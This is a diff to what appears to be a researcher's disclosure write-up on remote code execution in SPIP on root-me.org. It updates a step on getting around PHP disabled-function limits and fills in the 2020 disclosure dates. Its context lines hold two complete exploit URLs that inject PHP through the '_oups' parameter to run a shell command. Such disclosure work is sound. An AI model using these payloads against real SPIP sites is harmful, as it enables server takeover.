@@ -317,7 +317,7 @@ https://www.root-me.org/ecrire/?exec=article&id_article=1&ajouter=non&tri_liste_
 <img class="img_med" src="/hacking/rce_on_spip_and_root_me/eval_debug.jpg" alt="eval_debug">
 1. Spawn a phpinfo to see what is allowed / forbidden
 <img class="img_big" src="/hacking/rce_on_spip_and_root_me/phpinfo.jpg" alt="phpinfo">
-1. Bypass the restricted_functions with `popen` which wasn’t restricted
+1. Bypass the php disable_functions policieswith `popen` which wasn’t restricted // Edit, I probably just forgot to echo the result of shell_exec.. :)
 ```html
 https://www.root-me.org/ecrire/?exec=article&id_article=1&ajouter=non&tri_liste_aut=statut&deplacer=oui&_oups='<?php echo fread(popen("id", "r"), 300);?>
 https://www.root-me.org/ecrire/?exec=article&id_article=1&ajouter=non&tri_liste_aut=statut&deplacer=oui&_oups=%27%3C?php%20echo%20fread(popen(%22id%22,%20%22r%22),%20300);?%3E
@@ -374,8 +374,8 @@ Another security feature has been added and enforced for admins: GPG
 - 17/05/2020: Still in touch, first SQLi reported
 - XX/05/2020: Patch for many XSS ans SQLi tested and validated (spip side)
 - XX/05/2020: W00t, got a shell?! (quickly reported & patched)
-- ??/??/2020: Finally publicly disclosed by spip, waiting a few days...
-- ??/??/2020: Article published!
+- 29/09/2020: Finally publicly disclosed by spip! :D
+- 29/09/2020: Article published! Yataaaa! `\o/`
 
 
 # Conclusion?
